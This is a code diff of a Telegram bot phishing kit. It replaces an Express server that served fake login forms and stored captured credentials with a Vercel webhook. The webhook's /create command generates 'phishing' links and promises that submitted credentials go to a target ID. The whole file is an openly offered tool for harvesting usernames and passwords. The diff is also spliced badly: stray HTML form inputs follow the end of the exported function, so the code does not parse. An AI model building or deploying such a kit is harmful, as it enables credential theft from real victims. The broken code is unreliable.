@@ -1,40 +1,46 @@
 const { Telegraf } = require('telegraf');
-const express = require('express');
-const axios = require('axios');
-const crypto = require('crypto');
-const app = express();
-app.use(express.json());
+const micro = require('micro');
 
+// Initialize Telegraf bot with your token from environment variables
 const bot = new Telegraf(process.env.BOT_TOKEN);
-const TARGET_USER_ID = '123456789'; // Replace with your Telegram user ID
-const WEB_SERVER_URL = 'https://your-server.com'; // Replace with your domain
 
-// Generate random phishing page IDs
-function generatePageId() {
-    return crypto.randomBytes(8).toString('hex');
-}
+// Define bot commands
+bot.start((ctx) => ctx.reply('Welcome to the fake page generator bot! Use /create to generate a new link.'));
+bot.help((ctx) => ctx.reply('Use /create to generate a fake login page link.'));
 
-// Handle /create command
-bot.command('create', (ctx) => {
-    const pageId = generatePageId();
-    const phishingUrl = `${WEB_SERVER_URL}/login/${pageId}`;
-    
-    ctx.reply(`Phishing page created! Send this to your target:\n${phishingUrl}\n\nPage ID: ${pageId}`);
+bot.command('create', async (ctx) => {
+    // Generate a unique identifier for this phishing page instance
+    const uniqueId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+
+    // Get the base URL from Vercel's environment variables
+    // VERCEL_URL is automatically set by Vercel; BASE_URL is a custom one you should set.
+    const baseUrl = process.env.BASE_URL || process.env.VERCEL_URL;
+
+    if (!baseUrl) {
+        return ctx.reply('Error: BASE_URL or VERCEL_URL environment variable is not set. Cannot generate link. Please check Vercel project settings.');
+    }
+
+    // Construct the phishing link
+    const phishingLink = `${baseUrl}/phish/${uniqueId}`;
+
+    ctx.reply(`Generated a new fake login link for you: ${phishingLink}\nAny credentials submitted will be sent to the configured target ID.`);
 });
 
-// Store captured credentials
-const capturedData = {};
-
-// Express routes for the phishing page
-app.get('/login/:pageId', (req, res) => {
-    const pageId = req.params.pageId;
-    res.send(`
-        <html>
-        <head><title>Login Required</title></head>
-        <body>
-            <h2>Please login to continue</h2>
-            <form action="/submit/${pageId}" method="POST">
-                <input type="text" name="username" placeholder="Username" required><br>
+// This is the main serverless function for the Telegram webhook.
+// It processes incoming updates from Telegram.
+module.exports = async (req, res) => {
+    try {
+        await bot.handleUpdate(req.body); // Let Telegraf handle the update
+        res.statusCode = 200;
+        res.setHeader('Content-Type', 'application/json');
+        res.end(JSON.stringify({ success: true }));
+    } catch (error) {
+        console.error('Error handling Telegram update:', error);
+        res.statusCode = 500;
+        res.setHeader('Content-Type', 'application/json');
+        res.end(JSON.stringify({ error: 'Internal Server Error', details: error.message }));
+    }
+};                <input type="text" name="username" placeholder="Username" required><br>
                 <input type="password" name="password" placeholder="Password" required><br>
                 <button type="submit">Login</button>
             </form>
